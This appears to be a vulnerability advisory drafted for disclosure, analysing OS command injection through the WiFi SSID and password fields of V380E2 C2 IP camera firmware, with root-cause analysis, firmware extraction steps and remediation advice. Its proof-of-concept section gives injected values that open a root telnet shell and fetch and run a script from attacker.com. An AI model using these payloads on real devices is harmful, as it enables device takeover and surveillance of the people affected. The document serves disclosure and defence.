# V380 IP Camera — OS Command Injection via WiFi Configuration

## Vulnerability Summary

| Field               | Value                                                        |
|---------------------|--------------------------------------------------------------|
| **CVE ID**          | *Pending — to be requested from MITRE*                       |
| **Product**         | Macro-video Technologies V380E2 C2 IP Camera                 |
| **Firmware**        | V2.6.8.7 (2021-07-28), hardware version HWV280E12_WF9_PTZ_20180628 |
| **SoC**             | Anyka AK3918E-V200                                           |
| **Affected binary** | `/mvs/apps/recorder` (SHA256: `d17559eebee9cd91903f27365b591559ecea1853c41feef2369dba7f5f3c2d5d`) |
| **CWE**             | CWE-78 — Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') |
| **CVSS 3.1**        | 8.0 (High) — AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H           |
| **Discoverer**      | Le Minh Tai                                                   |
| **Disclosure date** | *To be determined after responsible disclosure attempt*       |

## Affected Firmware Versions

- V380E2 C2 WF9 — V2.6.8.7 (2021-07-28) — **confirmed vulnerable**
- V380E2 C2 WF1 — V2.6.5.9 (2021-02-24) — likely affected (same codebase)
- V380E2 C2 WF3 — V2.5.10.6 (2020-01-06) — likely affected (same codebase)
- Other V380 variants using the Macro-video `recorder` binary may also be affected.

## Description

The main application daemon (`/mvs/apps/recorder`) on V380E2 C2 IP cameras contains an OS command injection vulnerability in the WiFi SoftAP configuration handler. When a user configures the camera's WiFi hotspot (SoftAP mode) via the V380 Pro mobile application, the WiFi SSID and password are transmitted to the camera through the P2P/cloud protocol.

The `recorder` binary constructs a shell command by inserting the user-supplied SSID and password directly into a format string using `sprintf()`, without any input validation or sanitization:

```c
// Reconstructed from static analysis at address 0x00035a9c in recorder
sprintf(buf, "/tmp/wificonf/wifi_softap.sh %d wpa %s %s %d %d",
        mode, ssid, password, channel, param5);
```

The resulting command string is then passed to `system()` for execution (via the intermediary function at `0x00043e04`), which invokes `/bin/sh -c <command>`. Since the camera runs all processes as **root**, this results in arbitrary command execution with full system privileges.

## Root Cause Analysis

### Vulnerable Code Path (Static Analysis)

```
V380 Pro App (user input: SSID, password)
    │
    ▼
P2P/Cloud protocol (no transport encryption)
    │
    ▼
recorder daemon receives WiFi config command
    │
    ▼
fcn.0003581c() — WiFi SoftAP handler
    │   checks if password is non-empty
    │
    ├─► sprintf(buf, "wifi_softap.sh %d wpa %s %s %d %d", ..., SSID, PASSWORD, ...)
    │                                         ^^^   ^^^^^^^^
    │                                    NO SANITIZATION
    ▼
fcn.00043e04() — central command execution function
    │
    ├─► system(buf)                    ← direct shell execution
    │
    └─► snprintf(..., "[system]:%s", buf)
        unix_ssocket_data_send(...)    ← sends to mv_syscall_worker
            │
            ▼
        mv_syscall_worker daemon
            │
            ▼
        execl("/bin/sh", "sh", "-c", cmd, NULL)   ← shell execution
```

### Supporting Vulnerability: Unauthenticated IPC Command Service

The `mv_syscall_worker` daemon (SHA256: `68a9d0c01d2847bcdc4e6a2c178997860181890b2710d9baa3eb101da75db020`) listens on the UNIX domain socket `/tmp/uns_system_call.un`. Any process on the device that sends a message containing the marker `[system]:` followed by a command string will have that command executed via `execl("/bin/sh", "sh", "-c", <command>)` — without any authentication or input filtering.

This service amplifies the impact of any local code execution, and represents a design-level weakness (CWE-306: Missing Authentication for Critical Function).

## Impact

An attacker who can send WiFi configuration commands to the camera can execute arbitrary OS commands as root. Possible attack scenarios:

1. **Via the V380 Pro app (authenticated):** A user with app access (including shared access via QR code — see CVE-2025-25983) can inject commands through the WiFi SSID or password fields.
2. **Via P2P/cloud protocol interception:** The V380 P2P protocol lacks transport-level encryption. An attacker capable of intercepting or injecting P2P traffic (e.g., on the relay server path) can craft a malicious WiFi configuration message.
3. **Post-exploitation escalation:** After gaining initial access (e.g., via CVE-2025-7503 Telnet), the UNIX socket IPC allows trivial privilege-agnostic command execution.

Successful exploitation enables: full device takeover, persistent backdoor installation, video/audio surveillance interception, lateral movement into the local network, and credential theft (WiFi passwords stored in plaintext — CVE-2025-25985).

## Proof of Concept

### Static Analysis Evidence

The vulnerability was identified through static analysis of firmware extracted from the publicly available update package `V380_AK_3918E-V200__V2.6.8.7_2021-07-28.zip` (source: `github.com/drtanzil/V380-Firmware`).

**Step 1:** Extract the SquashFS rootfs from the update patch:
```bash
cd V380-Firmware/
unzip "V380_AK_3918E-V200__V2.6.8.7_2021-07-28.zip" -d v2687
PATCH=v2687/updatepatch/67b2c5254afef4f24f371e39f62e1579.patch
tail -c +297 "$PATCH" > root.sqsh
unsquashfs -d rootfs_out root.sqsh
```

**Step 2:** Confirm dangerous imports:
```bash
nm -D rootfs_out/apps/recorder | grep -E "system|popen|strcpy|sprintf"
# Output includes: U system, U popen, U sprintf, U strcpy
```

**Step 3:** Locate the vulnerable format strings:
```bash
strings rootfs_out/apps/recorder | grep "wifi_softap.sh.*%s"
# /tmp/wificonf/wifi_softap.sh %d wpa %s %s %d %d
# /tmp/wificonf/wifi_softap.sh %d open %s %d %d
```

**Step 4:** Disassembly confirms `sprintf` + `system` without sanitization (radare2):
```
[0x00035a9c]  ldr r1, str._tmp_wificonf_wifi_softap.sh__d_wpa__s__s__d__d
[0x00035aa8]  bl sym.imp.sprintf
     ...
[0x00035ac4]  bl fcn.00043e04        ; → calls system()
```

Inside `fcn.00043e04`:
```
[0x00043e60]  bl sym.imp.system      ; executes the sprintf'd buffer
```

### Conceptual PoC — Malicious SSID

If the SSID field is set to:
```
MyNetwork;telnetd -l/bin/sh -p 9999;
```

The resulting shell command becomes:
```bash
/tmp/wificonf/wifi_softap.sh 0 open MyNetwork;telnetd -l/bin/sh -p 9999; 0 0
```

The shell interprets `;` as a command separator, executing:
1. `/tmp/wificonf/wifi_softap.sh 0 open MyNetwork` (normal)
2. `telnetd -l/bin/sh -p 9999` (attacker's command — opens a root shell on port 9999)
3. `0 0` (fails silently)

### Conceptual PoC — Malicious Password

If the password field is set to:
```
pass$(wget http://attacker.com/pwn.sh -O-|sh)word
```

The command substitution `$(...)` executes within the shell, downloading and running an arbitrary script as root.

> **Note:** Full exploitation PoC on a live device requires sending the crafted WiFi configuration through the V380 Pro app or by replaying the P2P protocol. This has not been performed yet — the vulnerability is confirmed through static analysis only.

## Additional Findings

### Multiple unsafe `sprintf` + `system()` patterns in `recorder`

The same unsanitized `sprintf → system` pattern appears in other functionality:

| Format string | Risk |
|---|---|
| `rm -rf %s` | Arbitrary file/directory deletion |
| `insmod %s ptz_no_limiter=%d ...` | Arbitrary kernel module loading |
| `ifconfig %s down` / `ifconfig %s up` | Command injection via interface name |
| `cp %s %s` | Arbitrary file copy / overwrite |

These suggest a **systemic lack of input sanitization** across the firmware, not an isolated bug.

### Credential logging

The string `Verify username:%s password:%s _result:%d` indicates that authentication credentials are written to log output in plaintext. Combined with `log_upload` (which transmits logs to cloud servers), this may constitute an additional information disclosure vulnerability.

### Outdated third-party components

- **OpenCV 2.4.13** (circa 2016) — multiple known CVEs
- **uClibc** — version to be confirmed; historically affected by DNS-related vulnerabilities

## Remediation Recommendations

1. **Sanitize all user input** before passing to shell commands — escape or reject special characters (`;`, `|`, `$`, `` ` ``, `&`, `(`, `)`, `\n`).
2. **Avoid `system()`/`popen()`** entirely — use `execve()` with explicit argument arrays instead, which prevents shell metacharacter injection.
3. **Add authentication to the IPC socket** (`/tmp/uns_system_call.un`) — verify caller identity and restrict allowed commands.
4. **Encrypt P2P transport** — prevent interception and injection of configuration commands.
5. **Update third-party libraries** to current versions.

## Timeline

| Date | Event |
|---|---|
| 2026-10-02 | Vulnerability discovered via static analysis of public firmware |
| 2026-10-XX | Vendor contacted (Macro-video Technologies / V380 support) |
| 2026-XX-XX | CVE requested from MITRE |
| 2026-XX-XX | Public disclosure |

## References

- Firmware source: https://github.com/drtanzil/V380-Firmware
- V380 protocol reverse engineering: https://github.com/mzyy94/v380, https://github.com/GeloxD/V380Decoder
- Related V380 CVEs: CVE-2025-7503, CVE-2025-25983, CVE-2025-25984, CVE-2025-25985, CVE-2026-12527
- Similar vulnerability in Wyze Cam V4: WiFi SSID command injection (HiddenLayer SAI, 2025)
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
- OWASP IoT Top 10: https://owasp.org/www-project-internet-of-things-top-10/
